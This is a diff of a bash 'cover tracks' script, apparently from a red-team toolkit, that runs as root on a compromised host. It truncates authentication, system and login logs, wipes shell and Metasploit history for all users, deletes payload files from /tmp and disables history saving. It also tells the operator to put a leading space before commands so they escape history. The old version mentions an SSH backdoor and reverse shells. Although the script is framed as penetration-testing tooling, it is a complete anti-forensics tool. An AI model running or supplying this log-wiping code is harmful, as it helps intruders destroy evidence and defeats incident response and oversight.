@@ -1,12 +1,13 @@
 #!/bin/bash
 
 # =======================================================
-#   IRTx Red Team - Cover Tracks Script
+#   IRTx Red Team - Cover Tracks Script v2
 #   Author: DataTrust Red Team
-#   Description: Clears logs, history and activity traces
-#                on a compromised target host.
-#   Run from: INSIDE the compromised target via SSH
-#   Usage: sudo bash cover_tracks.sh
+#   Description: Standalone track cleaner — run this
+#                if you need to clean up without running
+#                the full post_exploit.sh workflow.
+#   Run from: INSIDE the compromised target as root
+#   Usage:  bash cover_tracks.sh (space before bash!)
 # =======================================================
 
 # --- Colours ---
@@ -32,181 +33,121 @@ echo "     ██║   ██████╔╝███████║██║
 echo "     ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ╚════██║"
 echo "     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████║"
 echo -e "     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝${RESET}"
-echo -e "${CYAN}        IRTx Red Team — Cover Tracks Script${RESET}"
+echo -e "${CYAN}        IRTx Red Team — Cover Tracks Script v2${RESET}"
 echo -e "${YELLOW}        DataTrust Security Consultants${RESET}"
 echo ""
 
-# --- Critical OPSEC reminder ---
+# --- OPSEC reminder ---
 echo -e "${BOLD}${YELLOW}  ╔══════════════════════════════════════════════════════╗${RESET}"
-echo -e "${BOLD}${YELLOW}  ║  OPSEC REMINDER — IMPORTANT:                        ║${RESET}"
-echo -e "${BOLD}${YELLOW}  ║  This script must be run ON THE TARGET MACHINE      ║${RESET}"
-echo -e "${BOLD}${YELLOW}  ║  via your SSH backdoor — NOT on your Kali machine.  ║${RESET}"
-echo -e "${BOLD}${YELLOW}  ║                                                      ║${RESET}"
-echo -e "${BOLD}${YELLOW}  ║  Use SPACE before ALL manual commands you type       ║${RESET}"
-echo -e "${BOLD}${YELLOW}  ║  so they are excluded from bash history.             ║${RESET}"
-echo -e "${BOLD}${YELLOW}  ║  Example:  [SPACE]cat /etc/passwd                   ║${RESET}"
+echo -e "${BOLD}${YELLOW}  ║  Run this ON THE TARGET as root — not on Kali       ║${RESET}"
+echo -e "${BOLD}${YELLOW}  ║  SPACE before all manual commands                   ║${RESET}"
 echo -e "${BOLD}${YELLOW}  ╚══════════════════════════════════════════════════════╝${RESET}"
-echo ""
-
-# --- Confirm this is intentional ---
-echo -e "${RED}[!] WARNING: This will permanently delete logs on this system.${RESET}"
-echo -e "${YELLOW}[?] Are you sure you want to proceed? (yes/no):${RESET}"
-read -r CONFIRM
-if [[ "$CONFIRM" != "yes" ]]; then
-    echo -e "${CYAN}[*] Aborted. No changes made.${RESET}"
-    exit 0
-fi
 echo ""
 
 # --- Root check ---
 if [[ $EUID -ne 0 ]]; then
-    echo -e "${RED}[!] This script must be run as root. Use sudo.${RESET}"
+    echo -e "${RED}[!] Must be run as root. Run: su root first.${RESET}"
     exit 1
 fi
 
-# --- Track what was cleared ---
-CLEARED=()
-FAILED=()
-
-# Helper: truncate a file (safer than deleting — deletion is itself suspicious)
-truncate_file() {
-    local filepath=$1
-    if [ -f "$filepath" ]; then
-        truncate -s 0 "$filepath" 2>/dev/null
-        if [ $? -eq 0 ]; then
-            echo -e "  ${GREEN}[+] Cleared : $filepath${RESET}"
-            CLEARED+=("$filepath")
-        else
-            echo -e "  ${RED}[!] Failed  : $filepath (permission denied?)${RESET}"
-            FAILED+=("$filepath")
-        fi
-    else
-        echo -e "  ${CYAN}[~] Skipped : $filepath (does not exist)${RESET}"
-    fi
-}
-
-# =======================================================
-# STEP 1: CLEAR BASH HISTORY (current session + saved)
-# history -c  : clears in-memory history for this session
-# truncate    : wipes the saved history file on disk
-# HISTFILE=   : disables further history saving
-# =======================================================
-echo -e "${MAGENTA}[>] Step 1: Clearing Bash History ...${RESET}"
+# --- Confirmation ---
+echo -e "${RED}[!] This will permanently clear logs and history on this system.${RESET}"
+echo -e "${YELLOW}[?] Confirm all objectives and screenshots are done. Proceed? (yes/no):${RESET}"
+read -r CONFIRM
+if [[ "$CONFIRM" != "yes" ]]; then
+    echo -e "${CYAN}[*] Aborted — no changes made.${RESET}"
+    exit 0
+fi
 echo ""
 
-history -c 2>/dev/null
-echo -e "  ${GREEN}[+] In-memory session history cleared.${RESET}"
-
-# Clear history for all users we can access
-for HIST_FILE in /root/.bash_history /home/*/.bash_history; do
-    truncate_file "$HIST_FILE"
+# --- Shell history (bash + zsh, root + all users) ---
+echo -e "${MAGENTA}[>] Clearing Shell History ...${RESET}"
+cat /dev/null > ~/.bash_history 2>/dev/null
+cat /dev/null > ~/.zsh_history 2>/dev/null
+for HIST in /home/*/.bash_history /home/*/.zsh_history; do
+    [ -f "$HIST" ] && cat /dev/null > "$HIST" 2>/dev/null && \
+        echo -e "  ${GREEN}[+] Cleared : $HIST${RESET}"
 done
-
-# Disable history logging for remainder of this session
 export HISTFILE=/dev/null
 export HISTSIZE=0
-echo -e "  ${GREEN}[+] History logging disabled for current session.${RESET}"
+export SAVEHIST=0
+echo -e "  ${GREEN}[+] Session history disabled${RESET}"
 echo ""
 
-# =======================================================
-# STEP 2: CLEAR SYSTEM AUTH & SECURITY LOGS
-# Truncating rather than deleting — deletion leaves an
-# obvious gap in the filesystem that forensics will catch.
-# =======================================================
-echo -e "${MAGENTA}[>] Step 2: Clearing System Logs ...${RESET}"
+# --- Metasploit history ---
+echo -e "${MAGENTA}[>] Clearing Metasploit History ...${RESET}"
+for MSF_HIST in /root/.msf4/history /home/*/.msf4/history; do
+    if [ -f "$MSF_HIST" ]; then
+        cat /dev/null > "$MSF_HIST" 2>/dev/null
+        echo -e "  ${GREEN}[+] Cleared : $MSF_HIST${RESET}"
+    fi
+done
 echo ""
 
-LOG_FILES=(
+# --- wget traces ---
+echo -e "${MAGENTA}[>] Removing wget Traces ...${RESET}"
+for WGET_HSTS in /root/.wget-hsts /home/*/.wget-hsts; do
+    if [ -f "$WGET_HSTS" ]; then
+        rm -f "$WGET_HSTS" 2>/dev/null
+        echo -e "  ${GREEN}[+] Removed : $WGET_HSTS${RESET}"
+    fi
+done
+echo ""
+
+# --- Clean /tmp ---
+echo -e "${MAGENTA}[>] Cleaning /tmp ...${RESET}"
+rm -f /tmp/*.sh /tmp/*.elf /tmp/*.txt /tmp/*.rc 2>/dev/null
+echo -e "  ${GREEN}[+] /tmp cleaned${RESET}"
+echo ""
+
+# --- System logs ---
+echo -e "${MAGENTA}[>] Clearing System Logs ...${RESET}"
+LOGS=(
     "/var/log/auth.log"
     "/var/log/auth.log.1"
     "/var/log/syslog"
     "/var/log/syslog.1"
+    "/var/log/kern.log"
     "/var/log/messages"
     "/var/log/secure"
-    "/var/log/kern.log"
-    "/var/log/daemon.log"
-    "/var/log/debug"
     "/var/log/faillog"
+    "/var/log/dpkg.log"
+    "/var/log/wtmp"
+    "/var/log/btmp"
+    "/var/log/lastlog"
 )
-
-for log in "${LOG_FILES[@]}"; do
-    truncate_file "$log"
+for log in "${LOGS[@]}"; do
+    if [ -f "$log" ]; then
+        truncate -s 0 "$log" 2>/dev/null && \
+            echo -e "  ${GREEN}[+] Cleared : $log${RESET}" || \
+            echo -e "  ${RED}[!] Failed  : $log${RESET}"
+    fi
 done
 echo ""
 
-# =======================================================
-# STEP 3: CLEAR LOGIN RECORDS
-# wtmp  : records all logins and logouts
-# btmp  : records failed login attempts
-# lastlog: records last login per user
-# These are binary files — truncate, don't delete.
-# =======================================================
-echo -e "${MAGENTA}[>] Step 3: Clearing Login Records ...${RESET}"
+# --- Manual checklist ---
+echo -e "${MAGENTA}[>] Manual Checklist — verify before disconnecting:${RESET}"
+echo ""
+echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} No files left behind: ${CYAN}ls -la /tmp${RESET}"
+echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} No rogue processes running: ${CYAN}ps aux${RESET}"
+echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} No cron jobs added: ${CYAN}crontab -l${RESET}"
+echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} MSF history cleared on Kali: ${CYAN}cat /dev/null > ~/.msf4/history${RESET}"
 echo ""
 
-truncate_file "/var/log/wtmp"
-truncate_file "/var/log/btmp"
-truncate_file "/var/log/lastlog"
-echo ""
-
-# =======================================================
-# STEP 4: CLEAR SSH LOGS & KNOWN HOSTS
-# Removes evidence of our SSH backdoor connection
-# from the target's own SSH records.
-# =======================================================
-echo -e "${MAGENTA}[>] Step 4: Clearing SSH Traces ...${RESET}"
-echo ""
-
-truncate_file "/var/log/auth.log"
-
-# Remove our Kali machine from target's known_hosts
-for KNOWN in /root/.ssh/known_hosts /home/*/.ssh/known_hosts; do
-    truncate_file "$KNOWN"
-done
-
-echo ""
-
-# =======================================================
-# STEP 5: MANUAL OPSEC CHECKLIST
-# Things the script cannot automate — operator must
-# verify these manually before disconnecting.
-# =======================================================
-echo -e "${MAGENTA}[>] Step 5: Manual OPSEC Checklist${RESET}"
-echo ""
-echo -e "${BOLD}${YELLOW}  The following must be verified MANUALLY before exiting:${RESET}"
-echo ""
-echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Remove any files you uploaded or created on this system"
-echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Remove any netcat listeners or reverse shells still running"
-echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Remove your public key from ~/.ssh/authorized_keys if persistence is no longer needed"
-echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Check running processes — kill anything you started: ${CYAN}ps aux${RESET}"
-echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Check cron jobs you may have added: ${CYAN}crontab -l${RESET}"
-echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Verify no temp files remain in /tmp: ${CYAN}ls -la /tmp${RESET}"
-echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Confirm bash history is empty before exiting: ${CYAN}history${RESET}"
-echo ""
-
-# =======================================================
-# FINAL SUMMARY
-# =======================================================
+# --- Final summary ---
 echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
 echo -e "${BOLD}${GREEN}  Track Covering Complete!${RESET}"
 echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
-echo -e "  ${GREEN}Files cleared : ${#CLEARED[@]}${RESET}"
-echo -e "  ${RED}Files failed  : ${#FAILED[@]}${RESET}"
-
-if [ ${#FAILED[@]} -gt 0 ]; then
-    echo ""
-    echo -e "  ${YELLOW}Failed files (may need manual clearing):${RESET}"
-    for f in "${FAILED[@]}"; do
-        echo -e "    ${RED}► $f${RESET}"
-    done
-fi
-
+echo -e "  ${YELLOW}Shell history :${RESET} Cleared (bash + zsh, all users)"
+echo -e "  ${YELLOW}MSF history   :${RESET} Cleared"
+echo -e "  ${YELLOW}wget traces   :${RESET} Removed"
+echo -e "  ${YELLOW}/tmp          :${RESET} Cleaned"
+echo -e "  ${YELLOW}System logs   :${RESET} Truncated"
 echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
 echo ""
-echo -e "${BOLD}${YELLOW}  FINAL OPSEC REMINDERS:${RESET}"
-echo -e "${YELLOW}  ► Type: ${CYAN}history -c && exit${YELLOW} as your LAST command when done${RESET}"
-echo -e "${YELLOW}  ► Do NOT forget the space before that command${RESET}"
-echo -e "${YELLOW}  ► Complete the manual checklist above before disconnecting${RESET}"
+echo -e "${BOLD}${RED}  FINAL COMMAND to exit cleanly:${RESET}"
+echo -e "  ${CYAN}  cat /dev/null > ~/.zsh_history; exit${RESET}"
+echo -e "  ${YELLOW}  (space before cat)${RESET}"
 echo ""
 
 exit 0
